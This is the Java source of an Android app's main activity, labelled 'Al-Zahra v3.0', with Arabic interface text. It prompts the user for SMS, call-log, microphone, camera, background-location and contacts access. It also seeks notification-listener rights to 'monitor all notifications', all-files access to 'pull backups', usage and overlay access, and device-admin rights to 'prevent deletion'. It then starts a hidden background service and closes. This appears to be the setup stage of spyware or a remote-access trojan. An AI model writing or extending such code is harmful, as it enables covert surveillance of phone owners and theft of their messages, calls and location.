package com.alzahra;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.alzahra.receiver.AdminReceiver;
import com.alzahra.service.CoreService;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    private static final String TAG = "MainActivity";
    private static final int PERMISSION_REQUEST_CODE = 1001;
    private static final int REQUEST_NOTIFICATION_ACCESS = 1002;
    private static final int REQUEST_MANAGE_STORAGE = 1003;
    private static final int REQUEST_DEVICE_ADMIN = 1004;
    private static final int REQUEST_BATTERY_OPT = 1005;
    private static final int REQUEST_OVERLAY = 1006;
    private static final int REQUEST_USAGE_ACCESS = 1007;
    private static final int REQUEST_WRITE_SETTINGS = 1008;

    private SharedPreferences prefs;
    private Handler handler;
    private int currentStep = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Log.d(TAG, "=== Al-Zahra v3.0 Starting ===");

        prefs = getSharedPreferences("alzahra_prefs", MODE_PRIVATE);
        handler = new Handler(Looper.getMainLooper());

        if (prefs.getBoolean("configured", false)) {
            startCoreService();
            finishAffinity();
            return;
        }
        currentStep = 0;
        runSetupStep();
    }

    private void runSetupStep() {
        switch (currentStep) {
            case 0: requestBasicPermissions(); break;
            case 1: requestNotificationAccess(); break;
            case 2: requestStoragePermission(); break;
            case 3: requestOverlayPermission(); break;
            case 4: requestUsageAccess(); break;
            case 5: requestWriteSettings(); break;
            case 6: requestBatteryOptimization(); break;
            case 7: requestDeviceAdmin(); break;
            case 8: completeSetup(); break;
        }
    }

    private void nextStep() {
        currentStep++;
        handler.postDelayed(this::runSetupStep, 500);
    }

    // ═══════════════════════════════════════════
    // الصلاحيات الأساسية
    // ═══════════════════════════════════════════
    private void requestBasicPermissions() {
        List<String> needed = new ArrayList<>();

        String[] permissions;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions = new String[]{
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.PROCESS_OUTGOING_CALLS,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.ACCESS_BACKGROUND_LOCATION,
                Manifest.permission.CAMERA,
                Manifest.permission.POST_NOTIFICATIONS,
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO,
                Manifest.permission.READ_MEDIA_AUDIO,
                Manifest.permission.BLUETOOTH_CONNECT,
                Manifest.permission.BLUETOOTH_SCAN,
                Manifest.permission.VIBRATE,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.ANSWER_PHONE_CALLS,
                Manifest.permission.MODIFY_AUDIO_SETTINGS
            };
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            permissions = new String[]{
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.PROCESS_OUTGOING_CALLS,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.ACCESS_BACKGROUND_LOCATION,
                Manifest.permission.CAMERA,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.VIBRATE,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.MODIFY_AUDIO_SETTINGS
            };
        } else {
            permissions = new String[]{
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.PROCESS_OUTGOING_CALLS,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.CAMERA,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.VIBRATE,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.MODIFY_AUDIO_SETTINGS
            };
        }

        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                needed.add(perm);
            }
        }

        if (needed.isEmpty()) {
            nextStep();
        } else {
            ActivityCompat.requestPermissions(this, needed.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            nextStep();
        }
    }

    // ═══════════════════════════════════════════
    // الوصول للإشعارات
    // ═══════════════════════════════════════════
    private void requestNotificationAccess() {
        if (isNotificationAccessGranted()) {
            nextStep();
            return;
        }
        try {
            showPermissionDialog("الوصول للإشعارات",
                "يرجى تفعيل الوصول للإشعارات لمراقبة جميع الإشعارات الواردة",
                Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS, REQUEST_NOTIFICATION_ACCESS);
        } catch (Exception e) {
            nextStep();
        }
    }

    private boolean isNotificationAccessGranted() {
        String enabled = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        return enabled != null && enabled.contains(getPackageName());
    }

    // ═══════════════════════════════════════════
    // إدارة التخزين
    // ═══════════════════════════════════════════
    private void requestStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (Environment.isExternalStorageManager()) {
                nextStep();
                return;
            }
            try {
                showPermissionDialog("الوصول لجميع الملفات",
                    "يرجى السماح بالوصول لجميع الملفات لسحب النسخ الاحتياطية",
                    Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION, REQUEST_MANAGE_STORAGE);
            } catch (Exception e) {
                nextStep();
            }
        } else {
            nextStep();
        }
    }

    // ═══════════════════════════════════════════
    // الظهور فوق التطبيقات
    // ═══════════════════════════════════════════
    private void requestOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (Settings.canDrawOverlays(this)) {
                nextStep();
                return;
            }
            try {
                showPermissionDialog("الظهور فوق التطبيقات",
                    "يرجى السماح بالظهور فوق التطبيقات الأخرى للحماية الكاملة",
                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION, REQUEST_OVERLAY);
            } catch (Exception e) {
                nextStep();
            }
        } else {
            nextStep();
        }
    }

    // ═══════════════════════════════════════════
    // الوصول للاستخدام
    // ═══════════════════════════════════════════
    private void requestUsageAccess() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            if (isUsageAccessGranted()) {
                nextStep();
                return;
            }
            try {
                showPermissionDialog("الوصول للاستخدام",
                    "يرجى تفعيل الوصول للاستخدام لمراقبة التطبيقات",
                    Settings.ACTION_USAGE_ACCESS_SETTINGS, REQUEST_USAGE_ACCESS);
            } catch (Exception e) {
                nextStep();
            }
        } else {
            nextStep();
        }
    }

    private boolean isUsageAccessGranted() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            try {
                return Settings.Secure.getInt(getContentResolver(), "usage_access") == 1;
            } catch (Exception e) {
                return false;
            }
        }
        return true;
    }

    // ═══════════════════════════════════════════
    // تعديل إعدادات النظام
    // ═══════════════════════════════════════════
    private void requestWriteSettings() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (Settings.System.canWrite(this)) {
                nextStep();
                return;
            }
            try {
                showPermissionDialog("تعديل إعدادات النظام",
                    "يرجى السماح بتعديل إعدادات النظام",
                    Settings.ACTION_MANAGE_WRITE_SETTINGS, REQUEST_WRITE_SETTINGS);
            } catch (Exception e) {
                nextStep();
            }
        } else {
            nextStep();
        }
    }

    // ═══════════════════════════════════════════
    // تحسين البطارية
    // ═══════════════════════════════════════════
    private void requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null && pm.isIgnoringBatteryOptimizations(getPackageName())) {
                nextStep();
                return;
            }
            try {
                showPermissionDialog("تجاهل تحسين البطارية",
                    "يرجى السماح بتجاهل تحسين البطارية للعمل المستمر",
                Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, REQUEST_BATTERY_OPT);
            } catch (Exception e) {
                nextStep();
            }
        } else {
            nextStep();
        }
    }

    // ═══════════════════════════════════════════
    // مسؤول الجهاز
    // ═══════════════════════════════════════════
    private void requestDeviceAdmin() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(this, AdminReceiver.class);
        if (dpm != null && dpm.isAdminActive(admin)) {
            nextStep();
            return;
        }
        try {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "يرجى تفعيل صلاحية المسؤول لحماية الجهاز ومنع الحذف");
            startActivityForResult(intent, REQUEST_DEVICE_ADMIN);
        } catch (Exception e) {
            nextStep();
        }
    }

    // ═══════════════════════════════════════════
    // إكمال الإعداد
    // ═══════════════════════════════════════════
    private void completeSetup() {
        prefs.edit().putBoolean("configured", true).apply();
        startCoreService();
        handler.postDelayed(this::finishAffinity, 1500);
    }

    private void startCoreService() {
        try {
            Intent serviceIntent = new Intent(this, CoreService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            Log.d(TAG, "CoreService started");
        } catch (Exception e) {
            Log.e(TAG, "Failed to start service", e);
        }
    }

    // ═══════════════════════════════════════════
    // حوار الصلاحيات
    // ═══════════════════════════════════════════
    private void showPermissionDialog(String title, String message, String action, int requestCode) {
        new AlertDialog.Builder(this)
            .setTitle(title)
            .setMessage(message)
            .setPositiveButton("موافق", (dialog, which) -> {
                try {
                    Intent intent = new Intent(action);
                    if (action.equals(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION) ||
                        action.equals(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)) {
                        intent.setData(Uri.parse("package:" + getPackageName()));
                    } else if (action.equals(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)) {
                        intent.setData(Uri.parse("package:" + getPackageName()));
                    } else if (action.equals(Settings.ACTION_MANAGE_WRITE_SETTINGS)) {
                        intent.setData(Uri.parse("package:" + getPackageName()));
                    }
                    startActivityForResult(intent, requestCode);
                } catch (Exception e) {
                    nextStep();
                }
            })
            .setNegativeButton("تخطي", (dialog, which) -> nextStep())
            .setCancelable(false)
            .show();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        nextStep();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (handler != null) handler.removeCallbacksAndMessages(null);
    }
}
